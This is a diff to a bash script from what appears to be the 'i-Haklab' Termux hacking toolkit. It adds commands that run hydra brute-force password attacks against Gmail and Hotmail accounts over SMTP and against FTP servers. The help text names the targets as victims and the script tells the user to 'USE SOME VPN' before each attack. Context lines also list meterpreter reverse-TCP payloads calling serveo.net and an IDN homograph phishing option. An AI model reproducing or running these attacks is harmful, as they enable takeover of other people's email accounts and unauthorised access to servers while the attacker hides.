@@ -1,11 +1,11 @@
 #!/data/data/com.termux/files/usr/bin/bash
 #Created on Dec/2018
 IFS=$'\n\t'
-trap ctrl_c 2
+#trap ctrl_c 2
 source /data/data/com.termux/files/usr/libexec/colors
 function ctrl_c() {
                 echo
-                printf "$Y\n\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n\n"
+                printf "$Y\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n"
 }
 function banner {
 	if [ -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
@@ -83,6 +83,11 @@ Arguments  |    options     |    Description
 |               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
 |                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
 |                             LHOST=serveo.net file=outlan.exe
+╰─bfmail───➤──email─passwd──➤ Start a brute force attack wiyh hydra tool at email(hotmail/gmail) account
+|   ╰──────➤─────gmail──────➤ example: i-Haklab bfgmail victim@gmail.com passwords.txt
+|   ╰──────➤──hotmail/live──➤ example: i-Haklab bfgmail victim@live.com passwords.txt
+╰──bfftp───➤─user─passwd─ip─➤ Start a brite force attack at ftp server
+|    ╰─────➤────────────────➤ example: i-Haklab bfftp users.txt passwords.txt 0.0.0.0
 ╰─serveo───➤────────────────➤ Start a SSH client to request TCP port forwarding from the server and proxy
 |    ╰─────➤────domain──────➤ Start a SSH client to request port forwarding with especific dns
 ╰─evilurl──➤────────────────➤ Run EvilUrl to generate an unicode domain for homonymous IDN attacks
@@ -383,6 +388,44 @@ elif [ $1 = handler ] && [ $2 ]; then
 	else
 		printf "$R[w]->$W File $2 doesn't exist\n"
 	fi
+elif [ $1 = bfmail ] && [ -z $2 ]; then
+        printf "$R[w]->$W bfmail argument need a mail/victim as option 1$G\n[ex]->$W i-Haklab bfmail victim@gmail.com passwords.txt"
+elif [ $1 = bfmail ] && [ $2 ] && [ -z $3 ]; then
+        printf "$R[w]->$W bfmail argument need a passwords file as option 2$G\n[ex]->$W i-Haklab bfmail victim@hotmail.com passwords.txt"
+elif [ $1 = bfmail ] && [ $2 ] && [ $3 ]; then
+        echo $2 > $PREFIX/tmp/bfmail
+        MAIL=$(cat $PREFIX/tmp/bfmail | grep -oE '([hotgmailve]{4,7})')
+        if [ ! -e $3 ]; then
+                printf "$R[w]->$W File for passwords not found"
+        elif [ -e $3 ] && [ "$MAIL" = "hotmail" -o "$MAIL" = "live" -o "$MAIL" = "gmail" ]; then
+                rm $PREFIX/tmp/bfmail
+                printf "$R[w]-> USE SOME VPN <-[w]$W\n  press$G enter$W to start\n"
+                read enter
+		if [ "$MAIL" = hotmail -o "$MAIL" = "live" ]; then
+			SMTP=smtp.live.com
+		elif [ "$MAIL" = "gmail" ]; then
+			SMTP=smtp.gmail.com
+		else
+			printf "$R[w]->$W There is not a valid server"
+		fi
+                hydra -S -l $2 -P $3 -e ns -V -s 465 $SMTP smtp
+        fi
+elif [ $1 = bfftp ] && [ -z $2 ]; then
+        printf "$R[w]->$W bfftp argument need a users file as option 1$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
+elif [ $1 = bfftp ] && [ $2 ] && [ -z $3 ]; then
+        printf "$R[w]->$W bfftp argument need a passwords file as option 2$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
+elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ -z $4 ]; then
+        printf "$R[w]->$W bfftp argument need an ip/victim as option 3$G\n[ex]->$W i-Haklab bfftp users.txt passwords.txt 0.0.0.0"
+elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ $4 ]; then
+        if [ ! -e $2 ]; then
+                printf "$R[w]->$W File for users not found"
+        elif [ ! -e $3 ]; then
+                printf "$R[w]->$W File for passwords not found"
+        elif [ -e $2 ] && [ -e $3 ]; then
+                printf "$R[w]-> USE SOME VPN <-[w]$W\n  press$G enter$W to start"
+                read enter
+                hydra -L $2 -P $3 $4 ftp
+        fi
 elif [ $1 = evilurl ]; then
 	WHEREAMI=$PWD
 	cd $iHAKLAB/../EvilURL;python evilurl.py;cd $WHEREAMI
